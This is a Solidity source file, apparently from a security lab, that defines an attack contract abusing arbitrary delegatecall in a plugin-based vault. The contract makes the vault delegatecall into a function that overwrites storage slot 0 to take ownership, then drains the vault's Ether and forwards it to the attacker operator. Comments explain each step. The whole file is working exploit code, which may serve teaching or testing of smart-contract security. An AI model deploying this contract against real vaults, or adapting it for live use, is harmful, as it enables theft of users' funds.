// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

interface IPluginVault {
    function runPlugin(address plugin, bytes calldata data) external;
    function sweepFunds(address recipient) external;
    function vaultBalance() external view returns (uint256);
}

/// @title DelegatecallHijacker
/// @author Solidity Security Lab
/// @notice Attack contract that abuses arbitrary delegatecall to overwrite ownership and drain a vault.
contract DelegatecallHijacker {
    /// @notice Attacker operator that controls the exploit contract.
    address public immutable operator;

    /// @notice Emitted when ownership hijack and draining sequence succeeds.
    event AttackExecuted(address indexed target, uint256 drainedAmount);

    /// @notice Emitted when stolen Ether is forwarded to the attacker operator.
    event LootWithdrawn(address indexed recipient, uint256 amount);

    constructor() {
        operator = msg.sender;
    }

    /// @notice Executes the full exploit against a vulnerable delegatecall-based vault.
    function attack(address targetAddress) external {
        require(msg.sender == operator, "Only operator can attack");

        IPluginVault target = IPluginVault(targetAddress);
        uint256 drainAmount = target.vaultBalance();
        require(drainAmount > 0, "Vault is empty");

        // Step 1:
        // force the target to delegatecall into this contract and execute overwriteOwner().
        // Because delegatecall uses the target's storage context, slot 0 in the target
        // will be overwritten with address(this).
        bytes memory payload = abi.encodeWithSignature(
            "overwriteOwner(address)",
            address(this)
        );
        target.runPlugin(address(this), payload);

        // Step 2:
        // now that the vault believes this contract is the owner,
        // the exploit contract can call the owner-only sweep function directly.
        target.sweepFunds(address(this));

        emit AttackExecuted(targetAddress, drainAmount);
    }

    /// @notice Overwrites storage slot 0 with a new owner value when executed via delegatecall.
    /// @dev This function is harmless in this contract's own storage, but devastating when delegatecalled.
    function overwriteOwner(address newOwner) external {
        assembly {
            sstore(0, newOwner)
        }
    }

    /// @notice Transfers stolen Ether to the attacker operator.
    function withdrawLoot() external {
        require(msg.sender == operator, "Only operator can withdraw loot");

        uint256 lootAmount = address(this).balance;
        require(lootAmount > 0, "No loot available");

        (bool success, ) = payable(operator).call{value: lootAmount}("");
        require(success, "Loot transfer failed");

        emit LootWithdrawn(operator, lootAmount);
    }

    receive() external payable {}
}
